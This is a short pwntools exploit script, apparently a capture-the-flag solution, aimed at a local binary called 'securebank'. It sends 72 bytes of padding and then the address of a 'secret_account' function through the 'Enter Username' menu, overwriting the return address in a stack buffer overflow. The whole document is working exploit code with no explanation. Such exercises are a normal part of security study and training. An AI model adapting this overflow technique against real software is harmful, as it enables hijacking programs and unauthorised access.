from pwn import *

# Set up the binary
context.binary = './securebank'

# Start the process
p = process('./securebank')

# Address of secret_account
secret_account = 0x4011b6  

# Craft the payload
payload = b"A" * 72  
payload += p64(secret_account)  # Overwrite return address

# Navigate the menu to reach the vulnerable function
p.sendline(b"1")  # Choose "Enter Username"
p.sendline(payload)  # Send the payload

# Receive and print the output
output = p.recvall()
print(output)
